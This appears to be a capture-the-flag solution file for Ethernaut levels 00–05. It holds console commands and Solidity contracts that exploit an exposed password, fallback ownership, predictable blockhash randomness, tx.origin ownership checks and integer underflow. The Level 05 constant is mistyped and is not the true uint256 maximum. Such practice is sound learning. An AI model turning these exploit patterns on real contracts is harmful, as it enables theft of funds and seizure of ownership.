# Levels

## Level 00

https://ethernaut.openzeppelin.com/level/0

```Javascript
await contract.password()
await contract.authenticate("ethernaut0")
```

https://mumbai.polygonscan.com/tx/0xb479fa5cda3731d1ceb34cd1b7788f30022e31d63eaf4ebc63351c22aa3f3806

## Level 01

https://ethernaut.openzeppelin.com/level/1

```javascript
await contract.owner() 
await contract.contributions("0x2a24869323C0B13Dff24E196Ba072dC790D52479")
await contract.contribute.sendTransaction({from: player, value: toWei('0.0009')})

await sendTransaction({from: player, to: contract.address, value: toWei('0.0000000001')})
await contract.withdraw()
```

## Level 02

https://ethernaut.openzeppelin.com/level/2

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Fallout {
    function Fal1out() external payable;
}
```

https://mumbai.polygonscan.com/tx/0x0473d27f57f28a8d48ecfecef2faf4e89f82cd3a79e6af2675faefd0761e44d4

## Level 03

https://ethernaut.openzeppelin.com/level/3

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface ICoinFlip {
    function consecutiveWins() external view returns (uint256);
    function flip(bool) external returns (bool);
}

contract Hack {
    ICoinFlip private immutable coinflip;
    uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _address) {
        coinflip = ICoinFlip(_address);
    }

    function flip() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        coinflip.flip(side);
    }    
}
```

call `flip()` until `consecutiveWins` is 10

## Level 04

https://ethernaut.openzeppelin.com/level/4

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function owner() external view returns (address);
    function changeOwner(address _owner) external;
}

contract HackTelephone {
    constructor(address _address) {
        ITelephone(_address).changeOwner(msg.sender);
    }
}
```

## Level 05

https://ethernaut.openzeppelin.com/level/5

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IToken {
    function transfer(address _to, uint _value) external returns (bool);
    function balanceOf(address _owner) external view returns (uint balance);
}

contract tokenHack {
    IToken private token;

    constructor(address _address) public  {
        token = IToken(_address);
    }

    function transfer(address _to) public {
        uint _value = 115392089237316195423570985008687907853269984665640564039457584007913129639935;
        token.transfer(_to, _value);
    }
}
```

